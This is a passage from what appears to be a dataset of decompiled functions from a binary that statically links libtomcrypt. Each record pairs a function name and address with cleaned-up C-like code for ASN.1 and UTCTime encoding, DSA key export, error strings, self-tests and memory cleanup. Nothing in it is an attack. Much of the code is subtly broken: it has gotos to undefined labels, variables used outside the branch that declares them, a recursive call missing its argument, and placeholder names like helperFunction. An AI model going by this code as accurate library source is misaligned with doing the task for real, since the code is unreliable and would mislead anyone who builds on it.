= inputValue << 8, loopIndex != -intermediateValue + 4; loopIndex = loopIndex + 1) {\n            }\n        }\n        *outputPointer = 2; \n        outputPointer[1] = (char)intermediateValue; \n        outputSize = 2; \n        loopCounter = outputSize; \n        if (intermediateValue == 0) goto LAB_0041767c; \n    } else {\n        \n        do {\n            intermediateValue = intermediateValue >> 8; \n            loopIndex = loopIndex + 1; \n        } while (intermediateValue != 0); \n        \n        \n        if (loopIndex == 0) {\n            loopIndex = 1; \n        }\n        \n        intermediateValue = loopIndex + (ulong)(inputValue >> ((loopIndex * 8 - 1) & 0x3f) & 1);\n        \n        if (intermediateValue < 5) {\n            goto LAB_0041761f; \n        }\n        *outputPointer = 2; \n        outputPointer[1] = (char)intermediateValue; \n        outputSize = 2; \n        \n        if (intermediateValue == 5) {\n            outputPointer[2] = 0; \n            intermediateValue = 4; \n            outputSize = 3; \n        }\n    }\n    \n    outputByteCounter = 0; \n    loopCounter = outputSize; \n    \n    do {\n        loopCounter = loopCounter + 1; \n        outputPointer[outputByteCounter + outputSize] = (char)(inputValue >> 0x18); \n        outputByteCounter = outputByteCounter + 1; \n        inputValue = inputValue << 8; \n    } while (outputByteCounter < intermediateValue); \n    \nLAB_0041767c:\n    *outputLengthPointer = loopCounter; \n    return 0; \n}"}
{"Function Name": "FUN_004177a0", "Address": "004177a0", "Source Code": "undefined8 FUN_004177a0(uint *inputArray, undefined *outputBuffer, ulong *outputLength)\n{\n    undefined character; \n    undefined8 result; \n    long index; \n    ulong finalLength; \n    ulong localOutputLength; \n    \n    if (inputArray == (uint *)0x0) {\n        FUN_00410bc0(\"utctime != NULL\", \"libtomcrypt.c\", 0x541d);\n    }\n    \n    if (outputBuffer == (undefined *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x541e);\n    }\n    \n    if (outputLength == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x541f);\n    }\n    \n    \n    result = FUN_00417710(inputArray, &localOutputLength);\n    \n    if ((int)result == 0) {\n        \n        if (localOutputLength <= *outputLength) {\n            *outputBuffer = 0x17; \n            \n            for (index = 0; index < 0x66; index++) {\n                if ((int)\"0123456789\"[(uint)((int)((ulong)*inputArray / 10) + (int)(((ulong)*inputArray / 10) / 10) * -10)] == (&DAT_0043e280)[index * 2]) {\n                    character = (&DAT_0043e284)[(long)(int)index * 8]; \n                    break; \n                }\n            }\n            outputBuffer[2] = character; \n            \n            for (index = 0; index < 0x66; index++) {\n                if ((int)\"0123456789\"[*inputArray % 10] == (&DAT_0043e280)[index * 2]) {\n                    character = (&DAT_0043e284)[(long)(int)index * 8];\n                    break;\n                }\n            }\n            outputBuffer[3] = character; \n            \n            for (index = 0; index < 0x66; index++) {\n                if ((int)\"0123456789\"[(uint)((int)((ulong)inputArray[1] / 10) + (int)(((ulong)inputArray[1] / 10) / 10) * -10)] == (&DAT_0043e280)[index * 2]) {\n                    character = (&DAT_0043e284)[(long)(int)index * 8];\n                    break;\n                }\n            }\n            outputBuffer[4] = character; \n            \n            for (index = 0; index < 0x66; index++) {\n                if ((int)\"0123456789\"[inputArray[1] % 10] == (&DAT_0043e280)[index * 2]) {\n                    character = (&DAT_0043e284)[(long)(int)index * 8];\n                    break;\n                }\n            }\n            outputBuffer[5] = character; \n            \n            for (index = 0; index < 0x66; index++) {\n                if ((int)\"0123456789\"[(uint)((int)((ulong)inputArray[2] / 10) + (int)(((ulong)inputArray[2] / 10) / 10) * -10)] == (&DAT_0043e280)[index * 2]) {\n                    character = (&DAT_0043e284)[(long)(int)index * 8];\n                    break;\n                }\n            }\n            outputBuffer[6] = character; \n            \n            for (index = 0; index < 0x66; index++) {\n                if ((int)\"0123456789\"[inputArray[2] % 10] == (&DAT_0043e280)[index * 2]) {\n                    character = (&DAT_0043e284)[(long)(int)index * 8];\n                    break;\n                }\n            }\n            outputBuffer[7] = character; \n            \n            for (index = 0; index < 0x66; index++) {\n                if ((int)\"0123456789\"[(uint)((int)((ulong)inputArray[3] / 10) + (int)(((ulong)inputArray[3] / 10) / 10) * -10)] == (&DAT_0043e280)[index * 2]) {\n                    character = (&DAT_0043e284)[(long)(int)index * 8];\n                    break;\n                }\n            }\n            outputBuffer[8] = character; \n            \n            for (index = 0; index < 0x66; index++) {\n                if ((int)\"0123456789\"[inputArray[3] % 10] == (&DAT_0043e280)[index * 2]) {\n                    character = (&DAT_0043e284)[(long)(int)index * 8];\n                    break;\n                }\n            }\n            outputBuffer[9] = character; \n            \n            for (index = 0; index < 0x66; index++) {\n                if ((int)\"0123456789\"[(uint)((int)((ulong)inputArray[4] / 10) + (int)(((ulong)inputArray[4] / 10) / 10) * -10)] == (&DAT_0043e280)[index * 2]) {\n                    character = (&DAT_0043e284)[(long)(int)index * 8];\n                    break;\n                }\n            }\n            outputBuffer[10] = character; \n            \n            for (index = 0; index < 0x66; index++) {\n                if ((int)\"0123456789\"[inputArray[4] % 10] == (&DAT_0043e280)[index * 2]) {\n                    character = (&DAT_0043e284)[(long)(int)index * 8];\n                    break;\n                }\n            }\n            outputBuffer[11] = character; \n            \n            for (index = 0; index < 0x66; index++) {\n                if ((int)\"0123456789\"[(uint)((int)((ulong)inputArray[5] / 10) + (int)(((ulong)inputArray[5] / 10) / 10) * -10)] == (&DAT_0043e280)[index * 2]) {\n                    character = (&DAT_0043e284)[(long)(int)index * 8];\n                    break;\n                }\n            }\n            outputBuffer[12] = character; \n            \n            for (index = 0; index < 0x66; index++) {\n                if ((int)\"0123456789\"[inputArray[5] % 10] == (&DAT_0043e280)[index * 2]) {\n                    character = (&DAT_0043e284)[(long)(int)index * 8];\n                    break;\n                }\n            }\n            outputBuffer[13] = character; \n            \n            if ((inputArray[8] == 0) && (inputArray[7] == 0)) {\n                \n                for (index = 0; index < 0x66; index++) {\n                    if ((&DAT_0043e280)[index * 2] == 0x5a) {\n                        character = (&DAT_0043e284)[(long)(int)index * 8];\n                        break;\n                    }\n                }\n                outputBuffer[14] = character; \n                character = 0xd; \n                finalLength = 0xf; \n            } else {\n                \n                for (index = 0; index < 0x66; index++) {\n                    if ((-(uint)(inputArray[6] == 0) & 0xfffffffe) + 0x2d == (&DAT_0043e280)[index * 2]) {\n                        character = (&DAT_0043e284)[(long)(int)index * 8];\n                        break;\n                    }\n                }\n                outputBuffer[14] = character; \n                \n                for (index = 0; index < 0x66; index++) {\n                    if ((int)\"0123456789\"[(uint)((int)((ulong)inputArray[7] / 10) + (int)(((ulong)inputArray[7] / 10) / 10) * -10)] == (&DAT_0043e280)[index * 2]) {\n                        character = (&DAT_0043e284)[(long)(int)index * 8];\n                        break;\n                    }\n                }\n                outputBuffer[15] = character; \n                \n                for (index = 0; index < 0x66; index++) {\n                    if ((int)\"0123456789\"[inputArray[7] % 10] == (&DAT_0043e280)[index * 2]) {\n                        character = (&DAT_0043e284)[(long)(int)index * 8];\n                        break;\n                    }\n                }\n                outputBuffer[16] = character; \n                \n                for (index = 0; index < 0x66; index++) {\n                    if ((int)\"0123456789\"[(uint)((int)((ulong)inputArray[8] / 10) + (int)(((ulong)inputArray[8] / 10) / 10) * -10)] == (&DAT_0043e280)[index * 2]) {\n                        character = (&DAT_0043e284)[(long)(int)index * 8];\n                        break;\n                    }\n                }\n                outputBuffer[17] = character; \n                \n                for (index = 0; index < 0x66; index++) {\n                    if ((int)\"0123456789\"[inputArray[8] % 10] == (&DAT_0043e280)[index * 2]) {\n                        character = (&DAT_0043e284)[(long)(int)index * 8];\n                        break;\n                    }\n                }\n                outputBuffer[18] = character; \n                character = 0x11; \n                finalLength = 0x13; \n            }\n            outputBuffer[1] = character; \n            *outputLength = finalLength; \n            return 0; \n        }\n    }\n    *outputLength = localOutputLength; \n    return result; \n}"}
{"Function Name": "FUN_00417f00", "Address": "00417f00", "Source Code": "char check_value(int input_value)\n{\n    \n    if (0x7ff < input_value) {\n        \n        return '\\x03';\n    }\n    \n    if (0x7f < input_value) {\n        \n        return '\\x02';\n    }\n    \n    return '\\x01';\n}"}
{"Function Name": "FUN_00418e50", "Address": "00418e50", "Source Code": "undefined4\nFUN_00418e50(long param_1, undefined8 param_2, undefined8 param_3, undefined8 param_4,\nundefined8 param_5, undefined8 param_6)\n{\n    undefined4 returnValue; \n    int *intArrayPtr; \n    int currentValue; \n    long longCounter; \n    size_t sizeCounter; \n    int *allocatedArrayPtr; \n    undefined8 *undefinedPtr1; \n    undefined8 *undefinedPtr2; \n    uint unsignedCounter; \n    undefined8 localUndefinedArray[4]; \n    \n    localUndefinedArray[2] = param_3; \n    localUndefinedArray[3] = param_4; \n    \n    if (param_1 == 0) { \n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x4c73); \n    }\n    \n    intArrayPtr = (int *)&stack0x00000008; \n    sizeCounter = 0; \n    unsignedCounter = 0x10; \n    \n    while (0x2f < unsignedCounter) { \n        currentValue = *intArrayPtr; \n        intArrayPtr += 2; \n        if (currentValue == 0) goto LAB_00418ef4; \n        if (0xe < currentValue - 1U) { \n            return 0x10; \n        }\n        sizeCounter++; \n    }\n    \n    currentValue = *(int *)((long)localUndefinedArray + (ulong)unsignedCounter); \n    if (0x2f < unsignedCounter + 8) goto LAB_00418ee8; \n    if (0x2f < unsignedCounter + 0x10) goto LAB_00418eec; \n    unsignedCounter += 0x18; \n    if (currentValue != 0) goto LAB_00418ed1; \n    \nLAB_00418ef4:\n    returnValue = 2; \n    if (sizeCounter != 0) { \n        intArrayPtr = (int *)calloc(0x40, sizeCounter); \n        returnValue = 0xd; \n        if (intArrayPtr != (int *)0x0) { \n            unsignedCounter = 0x10; \n            longCounter = 0; \n            allocatedArrayPtr = intArrayPtr; \n            do {\n                if (unsignedCounter < 0x30) { \n                    currentValue = *(int *)((long)localUndefinedArray + (ulong)unsignedCounter); \n                    if (0x2f < unsignedCounter + 8) goto LAB_00418fcd; \n                    unsignedCounter += 0x18; \n                } else {\n                    currentValue = *(int *)&stack0x00000008; \n                    unsignedCounter++; \n                }\n                \n                if (currentValue == 0) { \n                    returnValue = FUN_00418740(param_1, param_2, intArrayPtr, longCounter, 1); \n                    goto LAB_0041900c; \n                }\n                if (0xe < currentValue - 1U) { \n                    returnValue = 0x10; \n                    goto LAB_0041900c; \n                }\n                *allocatedArrayPtr = currentValue; \n                *(undefined8 *)(allocatedArrayPtr + 4) = *(undefined8 *)((long)localUndefinedArray + (ulong)(unsignedCounter - 0x18)); \n                *(undefined8 *)(allocatedArrayPtr + 2) = *(undefined8 *)((long)localUndefinedArray + (ulong)(unsignedCounter - 0x10)); \n                longCounter++; \n                allocatedArrayPtr += 0x10; \n            } while (true); \n        }\n    }\n    \nLAB_0041900c:\n    free(intArrayPtr); \n    return returnValue; \n}"}
{"Function Name": "FUN_00419720", "Address": "00419720", "Source Code": "undefined4\nFUN_00419720(long param_1,long param_2,undefined8 param_3,undefined8 param_4,undefined8 param_5,\nundefined8 param_6)\n{\n    undefined4 returnValue; \n    int *intArrayPtr; \n    int intValue; \n    uint unsignedIntValue; \n    uint unsignedIntValue2; \n    size_t sizeValue; \n    undefined8 localArray[4]; \n    undefined8 localVar1; \n    undefined8 localVar2; \n    \n    localArray[2] = param_3;\n    localArray[3] = param_4;\n    localVar1 = param_5;\n    localVar2 = param_6;\n    \n    if (param_1 == 0) {\n        FUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x5213); \n    }\n    \n    if (param_2 == 0) {\n        FUN_00410bc0(\"outlen != NULL\",\"libtomcrypt.c\",0x5214); \n    }\n    \n    intArrayPtr = (int *)&stack0x00000008; \n    sizeValue = 0; \n    unsignedIntValue2 = 0x10; \n    \n    do {\n        if (unsignedIntValue2 < 0x30) { \n            unsignedIntValue = unsignedIntValue2 + 8; \n            intValue = *(int *)((long)localArray + (ulong)unsignedIntValue2); \n            if (0x2f < unsignedIntValue) goto LAB_004197e4; \n            unsignedIntValue = unsignedIntValue2 + 0x10; \n            if (0x2f < unsignedIntValue) goto LAB_004197eb; \n            unsignedIntValue2 = unsignedIntValue2 + 0x18; \n        } else {\n            intValue = *intArrayPtr; \n            intArrayPtr = intArrayPtr + 2; \n            unsignedIntValue = unsignedIntValue2; \nLAB_004197e4:\n            intArrayPtr = intArrayPtr + 2; \nLAB_004197eb:\n            intArrayPtr = intArrayPtr + 2; \n            unsignedIntValue2 = unsignedIntValue; \n        }\n        \n        if (intValue == 0) {\n            if (sizeValue == 0) { \n                return 2; \n            }\n            intArrayPtr = (int *)calloc(0x40,sizeValue); \n            if (intArrayPtr == (int *)0x0) { \n                return 0xd; \n            }\n            unsignedIntValue2 = 0x10; \n            break; \n        }\n        \n        if ((0xe < intValue - 1U) || ((1L << ((byte)(intValue - 1U) & 0x3f) & 0x77ffU) == 0)) {\n            return 0x10; \n        }\n        sizeValue = sizeValue + 1; \n    } while (true); \nLAB_004198ce:\n    \n    if (unsignedIntValue2 < 0x30) {\n        unsignedIntValue = unsignedIntValue2 + 8; \n        intValue = *(int *)((long)localArray + (ulong)unsignedIntValue2); \n        if (0x2f < unsignedIntValue) goto LAB_004198db; \n        unsignedIntValue = unsignedIntValue2 + 0x10; \n        undefined8 undefinedValue = *(undefined8 *)((long)localArray + (ulong)unsignedIntValue); \n        if (0x2f < unsignedIntValue) goto LAB_004198e2; \n        unsignedIntValue2 = unsignedIntValue2 + 0x18; \n    } else {\n        intValue = *(int *)((undefined8 *)&stack0x00000008); \n        undefinedValue = *(undefined8 *)((undefined8 *)&stack0x00000008 + 1); \n        unsignedIntValue2 = unsignedIntValue2; \nLAB_004198db:\nLAB_004198e2:\n        unsignedIntValue2 = unsignedIntValue2; \n    }\n    undefined8 anotherUndefinedValue = *(undefined8 *)((undefined8 *)&stack0x00000008 + 2); \n    \n    if (intValue == 0) {\n        returnValue = FUN_00419040(intArrayPtr, 0, param_1, param_2, 0xd); \n        goto LAB_00419937; \n    }\n    \n    if ((0xe < intValue - 1U) || ((1L << ((byte)(intValue - 1U) & 0x3f) & 0x77ffU) == 0)) {\n        returnValue = 0x10; \nLAB_00419937:\n        free(intArrayPtr); \n        return returnValue; \n    }\n    *intArrayPtr = intValue; \n    *(undefined8 *)(intArrayPtr + 4) = undefinedValue; \n    intArrayPtr = intArrayPtr + 0x10; \n    goto LAB_004198ce; \n}"}
{"Function Name": "FUN_00419980", "Address": "00419980", "Source Code": "undefined4 FUN_00419980(undefined8 *inputArray, size_t elementCount, undefined8 additionalParam1, undefined8 additionalParam2)\n{\n    \n    undefined8 *allocatedMemory = (undefined8 *)calloc(elementCount, 0x40);\n    undefined4 statusCode = 0xd; \n    \n    if (allocatedMemory != (undefined8 *)0x0) {\n        size_t currentIndex = 0; \n        undefined8 *memoryPointer = allocatedMemory; \n        \n        if (elementCount != 0) {\n            do {\n                \n                *memoryPointer = *inputArray;\n                memoryPointer[1] = inputArray[1];\n                memoryPointer[2] = inputArray[2];\n                memoryPointer[3] = inputArray[3];\n                memoryPointer[4] = inputArray[4];\n                memoryPointer[5] = inputArray[5];\n                memoryPointer[6] = inputArray[6];\n                memoryPointer[7] = inputArray[7];\n                \n                *(int *)(memoryPointer + 3) = (int)currentIndex;\n                currentIndex++; \n                memoryPointer += 8; \n                inputArray += 8; \n            } while (currentIndex != elementCount); \n        }\n        \n        qsort(allocatedMemory, elementCount, 0x40, FUN_00401a90);\n        \n        statusCode = FUN_00419040(allocatedMemory, elementCount, additionalParam1, additionalParam2, 0xe);\n        \n        free(allocatedMemory);\n    }\n    \n    return statusCode;\n}"}
{"Function Name": "FUN_00419c80", "Address": "00419c80", "Source Code": "void FUN_00419c80(int *nodeList)\n{\n    int **nextNodePtr; \n    int currentValue; \n    int *nextPointer; \n    int *currentNode; \n    do {\n        nextNodePtr = (int **)(nodeList + 8); \n        while (*nextNodePtr != (int *)0x0) { \n            nodeList = *(int **)(nodeList + 0xe); \n            if (nodeList == (int *)0x0) { \n                nodeList = *nextNodePtr; \n            }\n        }\n        currentNode = nodeList; \n        nodeList = *(int **)(nodeList + 0xe); \n    } while (*nextNodePtr != (int *)0x0); \n    do {\n        if (*(long *)(currentNode + 0xc) != 0) { \n            *(undefined8 *)(*(long *)(currentNode + 0xc) + 0x38) = 0; \n            FUN_00419c80(); \n        }\n        currentValue = *currentNode; \n        if (currentValue == 2) { \n            if (*(long *)(currentNode + 2) != 0) { \n                (*DAT_00669920)(); \n            }\n        } else if (((currentValue < 2) || (2 < currentValue - 0xdU)) && (*(void **)(currentNode + 2) != (void *)0x0)) { \n            free(*(void **)(currentNode + 2)); \n        }\n        nextPointer = *(int **)(currentNode + 10); \n        free(currentNode); \n        currentNode = nextPointer; \n    } while (nextPointer != (int *)0x0); \n    return; \n}"}
{"Function Name": "FUN_0041a480", "Address": "0041a480", "Source Code": "undefined8 FUN_0041a480(long output,long output_length,int flag,int *key)\n{\n    undefined8 return_value; \n    int loop_counter; \n    undefined is_flag_set; \n    long long_value; \n    \n    if (output == 0) {\n        FUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x5b97); \n    }\n    \n    if (output_length == 0) {\n        FUN_00410bc0(\"outlen != NULL\",\"libtomcrypt.c\",0x5b98); \n    }\n    \n    if (key == (int *)0x0) {\n        FUN_00410bc0(\"key != NULL\",\"libtomcrypt.c\",0x5b99); \n    }\n    \n    if ((*key == 1) || (return_value = 0xe, flag != 1)) {\n        loop_counter = 0; \n        int *data_pointer = &DAT_0043de58; \n        \n        do {\n            loop_counter++; \n        } while (*data_pointer++ != 0); \n        \n        \n        if ((key[1] < loop_counter) && (-2 < key[1])) {\n            long_value = (long)**(int **)(key + 2); \n            is_flag_set = (flag != 1) ? 0 : 1; \n            \n            return_value = FUN_00419720(output,output_length,4,1,&is_flag_set,3,1,&long_value,2,1,\n                *(undefined8 *)(key + 4),2,1,*(undefined8 *)(key + 6),\n                (flag != 1) ? 0 : 2,1,*(undefined8 *)(key + 10),0,0,0);\n        } else {\n            return_value = 0x10; \n        }\n    }\n    return return_value; \n}"}
{"Function Name": "FUN_0041a7c0", "Address": "0041a7c0", "Source Code": "char * FUN_0041a7c0(uint input_value)\n{\n    \n    return (input_value < 0x18) ? \n        \n        (&status_messages)[(int)input_value] : \n        \n        \"Invalid error code.\";\n}"}
{"Function Name": "FUN_0041ae40", "Address": "0041ae40", "Source Code": "bool FUN_0041ae40(int input_value)\n{\n    \n    int *array_pointer = &DAT_0043de58;\n    \n    \n    int element_count = 0;\n    \n    \n    while (*array_pointer++ != 0) {\n        \n        element_count++;\n    }\n    \n    \n    return -2 < input_value && input_value < element_count;\n}"}
{"Function Name": "FUN_0041ae70", "Address": "0041ae70", "Source Code": "undefined8\nFUN_0041ae70(undefined8 *inputPointer, undefined8 firstParam, undefined8 secondParam, undefined8 thirdParam,\nundefined8 fifthParam, undefined8 sixthParam)\n{\n    long longValue; \n    undefined8 *pointerVar1; \n    undefined8 *pointerVar2; \n    int returnValue; \n    ulong unsignedLongValue; \n    int counter = 0; \n    uint localCounter = 8; \n    long *stackPointer = (long *)&stack0x00000008; \n    long longArray[4] = {0, firstParam, secondParam, thirdParam}; \n    if (inputPointer != (undefined8 *)0x0) { \n        do {\n            returnValue = (*DAT_00669910)(); \n            if (returnValue != 0) { \n                uint localValue = 8; \n                pointerVar2 = (undefined8 *)&stack0x00000008; \n                for (; counter != 0; counter--) { \n                    (*DAT_00669920)(*inputPointer); \n                    unsignedLongValue = (ulong)localValue; \n                    if (localValue < 0x30) { \n                        localValue += 8; \n                        inputPointer = *(undefined8 **)((long)longArray + unsignedLongValue); \n                    } else {\n                        pointerVar2++; \n                        inputPointer = (undefined8 *)*pointerVar2; \n                    }\n                }\n                return 0xd; \n            }\n            unsignedLongValue = (ulong)localCounter; \n            counter++; \n            if (localCounter < 0x30) break; \n            longValue = *stackPointer++; \n            if (longValue == 0) { \n                return 0; \n            }\n            localCounter += 8; \n        } while (*(long *)((long)longArray + unsignedLongValue) != 0); \n    }\n    return 0; \n}"}
{"Function Name": "FUN_0041af90", "Address": "0041af90", "Source Code": "void * FUN_0041af90(void) \n{\n    void *memory_pointer = allocate_memory(1, 0x18); \n    if (memory_pointer != (void *)0x0) { \n        if (another_function(memory_pointer, (long)memory_pointer + 8, (long)memory_pointer + 0x10, 0) != 0) { \n            release_memory(memory_pointer); \n            memory_pointer = (void *)0x0; \n        }\n    }\n    return memory_pointer; \n}"}
{"Function Name": "FUN_0041aff0", "Address": "0041aff0", "Source Code": "void FUN_0041aff0(long input_value, undefined8 first_param, undefined8 second_param, undefined8 third_param,\nundefined8 fourth_param, undefined8 fifth_param)\n{\n    long dereferenced_value; \n    ulong unsigned_value; \n    uint counter = 8; \n    long *pointer_to_long = (long *)&stack0x00000008; \n    long params_array[4] = {0, first_param, second_param, third_param}; \n    if (input_value != 0) { \n        do {\n            while (true) { \n                (*DAT_00669920)(); \n                unsigned_value = (ulong)counter; \n                if (counter < 0x30) break; \n                dereferenced_value = *pointer_to_long; \n                pointer_to_long++; \n                if (dereferenced_value == 0) { \n                    return; \n                }\n            }\n            counter += 8; \n        } while (*(long *)((long)params_array + unsigned_value) != 0); \n    }\n    return; \n}"}
{"Function Name": "FUN_0041b220", "Address": "0041b220", "Source Code": "void executeFunction(void) \n{\n    helperFunction(); \n}"}
{"Function Name": "FUN_0041b230", "Address": "0041b230", "Source Code": "void FUN_0041b230(long input_param)\n{\n    \n    if (input_param == 0) {\n        \n        error_handler(\"key != ((void *)0)\",\"libtomcrypt.c\",0x5be0);\n    }\n    \n    another_function(*(undefined8 *)(input_param + 0x10), \n                 *(undefined8 *)(input_param + 0x18), \n                 *(undefined8 *)(input_param + 0x20), \n                 *(undefined8 *)(input_param + 0x28), \n                 0); \n}"}
{"Function Name": "FUN_0041b830", "Address": "0041b830", "Source Code": "void executeFunction(void) \n{\n    helperFunction(); \n}"}
{"Function Name": "FUN_0041ba50", "Address": "0041ba50", "Source Code": "void FUN_0041ba50(undefined8 *input_pointer)\n{\n    \n    if (input_pointer != (undefined8 *)0x0) {\n        \n        process_data(*input_pointer, input_pointer[1], input_pointer[2], 0);\n        \n        release_memory(input_pointer);\n    }\n}"}
{"Function Name": "FUN_0041ca40", "Address": "0041ca40", "Source Code": "undefined8 FUN_0041ca40(undefined8 input_param_1, undefined8 input_param_2, int threshold_value, long memory_address)\n{\n    int current_value; \n    int *data_array_pointer = &DAT_0043de58; \n    int index = 0; \n    undefined8 return_value; \n    if (threshold_value < 0xf) { \n        \n        return_value = FUN_0041c770(input_param_1, input_param_2, memory_address, &DAT_0043de20 + (long)index * 0x38);\n        *(int *)(memory_address + 4) = index; \n    } else {\n        do {\n            current_value = *data_array_pointer; \n            if (threshold_value <= current_value) { \n                if (current_value < 0x43) { \n                    \n                    return_value = FUN_0041c770(input_param_1, input_param_2, memory_address, &DAT_0043de20 + (long)index * 0x38);\n                    *(int *)(memory_address + 4) = index; \n                    return return_value; \n                }\n                break; \n            }\n            data_array_pointer += 0xe; \n            index++; \n        } while (current_value != 0); \n        return_value = 3; \n    }\n    return return_value; \n}"}
{"Function Name": "FUN_0041ce70", "Address": "0041ce70", "Source Code": "ulong FUN_0041ce70(void) \n{\n    uint tempUnsignedInt; \n    int tempInt; \n    ulong returnValue; \n    undefined8 *firstResourcePtr; \n    undefined8 *secondResourcePtr; \n    undefined **dataStructurePtr; \n    int localIntValue; \n    undefined8 localUndefinedValue; \n    undefined8 localUndefinedArray[2]; \n    returnValue = FUN_0041ae70(&localUndefinedValue, localUndefinedArray, 0); \n    if ((int)returnValue != 0) { \n        return returnValue; \n    }\n    firstResourcePtr = (undefined8 *)FUN_0041af90(); \n    secondResourcePtr = (undefined8 *)FUN_0041af90(); \n    if (secondResourcePtr == (undefined8 *)0x0 || firstResourcePtr == (undefined8 *)0x0) { \n        FUN_0041aff0(localUndefinedValue, localUndefinedArray[0], 0); \n        FUN_0041ba50(firstResourcePtr); \n        FUN_0041ba50(secondResourcePtr); \n        return 0xd; \n    }\n    dataStructurePtr = &PTR_s_09487239995A5EE76B55F9C2F098_0043de48; \n    do {\n        tempUnsignedInt = (*DAT_00669980)(localUndefinedValue, dataStructurePtr[-3], 0x10); \n        returnValue = (ulong)tempUnsignedInt; \n        if (tempUnsignedInt != 0) break; \n        tempUnsignedInt = (*DAT_00669980)(localUndefinedArray[0], dataStructurePtr[-1], 0x10); \n        returnValue = (ulong)tempUnsignedInt; \n        if (tempUnsignedInt != 0) break; \n        tempUnsignedInt = (*DAT_00669a48)(localUndefinedValue, &localIntValue); \n        returnValue = (ulong)tempUnsignedInt; \n        if (tempUnsignedInt != 0) break; \n        if (localIntValue == 0) { \n            returnValue = 5; \n            break; \n        }\n        tempUnsignedInt = (*DAT_00669a48)(localUndefinedArray[0], &localIntValue); \n        returnValue = (ulong)tempUnsignedInt; \n        if (tempUnsignedInt != 0) break; \n        if (localIntValue == 0) { \n            returnValue = 5; \n            break; \n        }\n        tempUnsignedInt = (*DAT_00669980)(*firstResourcePtr, *dataStructurePtr, 0x10); \n        returnValue = (ulong)tempUnsignedInt; \n        if (tempUnsignedInt != 0) break; \n        tempUnsignedInt = (*DAT_00669980)(firstResourcePtr[1], dataStructurePtr[1], 0x10); \n        returnValue = (ulong)tempUnsignedInt; \n        if (tempUnsignedInt != 0) break; \n        (*DAT_00669938)(firstResourcePtr[2], 1); \n        tempUnsignedInt = (*DAT_006699b0)(localUndefinedArray[0], 1, localUndefinedArray[0]); \n        returnValue = (ulong)tempUnsignedInt; \n        if (tempUnsignedInt != 0) break; \n        tempUnsignedInt = (*DAT_00669a50)(localUndefinedArray[0], firstResourcePtr, secondResourcePtr, localUndefinedValue, 1); \n        returnValue = (ulong)tempUnsignedInt; \n        if (tempUnsignedInt != 0) break; \n        tempInt = (*DAT_00669958)(*firstResourcePtr, *secondResourcePtr); \n        if ((tempInt != 0) || (tempInt = (*DAT_00669958)(firstResourcePtr[1], secondResourcePtr[1]), tempInt != 0)) { \n            returnValue = 5; \n            break; \n        }\n        dataStructurePtr += 5; \n    } while (*(int *)dataStructurePtr != 0); \n    FUN_0041ba50(secondResourcePtr); \n    FUN_0041ba50(firstResourcePtr); \n    FUN_0041aff0(localUndefinedArray[0], localUndefinedValue, 0); \n    return returnValue; \n}"}
{"Function Name": "FUN_0041e650", "Address": "0041e650", "Source Code": "int FUN_0041e650(undefined8 param_1, undefined8 param_2, undefined4 *param_3)\n{\n    int returnStatus; \n    long loopIndex; \n    byte *allocatedMemoryPtr; \n    byte byteValue; \n    long loopCounter; \n    ulong stackData; \n    uint unsignedIntValue; \n    undefined8 localData; \n    undefined localBuffer[128]; \n    undefined4 localIntArray[2]; \n    undefined *localBufferPtr; \n    undefined8 localData2; \n    undefined4 localData3; \n    undefined8 localData4; \n    undefined8 localData5; \n    undefined4 localData6; \n    undefined4 localIntArray2[2]; \n    undefined4 *localIntArrayPtr; \n    long localSize; \n    \n    allocatedMemoryPtr = (byte *)calloc(1, 0x8000);\n    if (allocatedMemoryPtr == (byte *)0x0) { \n        returnStatus = 0xd; \n    } else {\n        localBufferPtr = localBuffer; \n        localIntArrayPtr = localIntArray; \n        localIntArray[0] = 7; \n        localData2 = 0x10; \n        localData3 = 6; \n        localSize = 0x8000; \n        localData6 = 0; \n        localIntArray2[0] = 0xd; \n        \n        returnStatus = FUN_00418740(param_1, param_2, localIntArray2, 2, 1);\n        unsignedIntValue = (uint)(stackData >> 0x20); \n        if (returnStatus == 0) { \n            loopIndex = 0; \n            if (localSize != 0) { \n                byteValue = *allocatedMemoryPtr; \n                loopCounter = 1; \n                while (loopCounter != 8) { \n                    byteValue = (*(allocatedMemoryPtr + loopCounter) | byteValue * '\\x02'); \n                    loopCounter++; \n                }\n                allocatedMemoryPtr[loopIndex] = byteValue; \n                loopIndex++; \n            }\n            \n            returnStatus = FUN_00418e50(allocatedMemoryPtr, loopIndex, 2, 1, *(undefined8 *)(param_3 + 6), 2, 1,\n                                 *(undefined8 *)(param_3 + 2),\n                                 stackData & 0xffffffff00000000, 0, 0);\n            if (returnStatus == 0) { \n                free(allocatedMemoryPtr); \n                *param_3 = 0; \n                return 0; \n            }\n            free(allocatedMemoryPtr); \n        } else {\n            free(allocatedMemoryPtr); \n            \n            returnStatus = FUN_00418e50(param_1, param_2, 2, 1, *(undefined8 *)(param_3 + 6), 0, 0, 0);\n            if (returnStatus == 0) { \n                returnStatus = (*DAT_00669960)(*(undefined8 *)(param_3 + 6), 0); \n                if (returnStatus == 0) { \n                    returnStatus = (*DAT_00669910)(&localData); \n                    if (returnStatus == 0) { \n                        \n                        returnStatus = FUN_00418e50(param_1, param_2, 2, 1, localData, 2, 1,\n                                             *(undefined8 *)(param_3 + 6),\n                                             CONCAT44(unsignedIntValue, 2), 1, *(undefined8 *)(param_3 + 2), 2, 1,\n                                             *(undefined8 *)(param_3 + 4), 2, 1,\n                                             *(undefined8 *)(param_3 + 8), 2, 1,\n                                             *(undefined8 *)(param_3 + 10), 2, 1,\n                                             *(undefined8 *)(param_3 + 0xe), 2, 1,\n                                             *(undefined8 *)(param_3 + 0x10), 2, 1,\n                                             *(undefined8 *)(param_3 + 0xc), 0, 0, 0);\n                        if (returnStatus == 0) { \n                            (*DAT_00669920)(localData); \n                            *param_3 = 1; \n                            return 0; \n                        }\n                        (*DAT_00669920)(); \n                    }\n                } else {\n                    returnStatus = 0x12; \n                    if ((returnStatus = (*DAT_00669960)(*(undefined8 *)(param_3 + 6), 1)) != 0 &&\n                        (returnStatus = FUN_00418e50(param_1, param_2, 2, 1, *(undefined8 *)(param_3 + 6), 2, 1,\n                                             *(undefined8 *)(param_3 + 2), (ulong)unsignedIntValue << 0x20, 0, 0), \n                         returnStatus == 0)) { \n                        *param_3 = 0; \n                        return 0; \n                    }\n                }\n            }\n        